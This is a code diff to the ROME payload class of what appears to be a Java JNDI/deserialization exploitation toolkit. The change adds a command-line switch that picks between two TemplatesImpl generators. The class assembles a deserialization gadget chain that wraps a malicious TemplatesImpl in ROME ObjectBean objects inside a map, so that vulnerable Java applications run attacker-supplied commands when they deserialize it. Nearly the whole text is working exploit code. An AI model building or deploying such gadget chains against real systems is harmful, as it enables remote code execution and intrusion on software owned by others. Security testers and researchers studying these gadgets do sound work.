@@ -4,9 +4,12 @@ import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.sun.syndication.feed.impl.ObjectBean;
 
 import javax.xml.transform.Templates;
+
+import static com.qi4l.jndi.Starter.cmdLine;
 
 /**
  * TemplatesImpl.getOutputProperties()
@@ -30,8 +33,13 @@ import javax.xml.transform.Templates;
 public class ROME implements ObjectPayload<Object> {
     @Override
     public Object getObject(PayloadType type, String... param) throws Exception {
-        Object                o        = Gadgets.createTemplatesImpl(type, param);
-        ObjectBean            delegate = new ObjectBean(Templates.class, o);
+        final Object templates;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            templates = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            templates = Gadgets.createTemplatesImpl(type, param);
+        }
+        ObjectBean            delegate = new ObjectBean(Templates.class, templates);
         ObjectBean            root     = new ObjectBean(ObjectBean.class, delegate);
         return Gadgets.makeMap(root, root);
     }
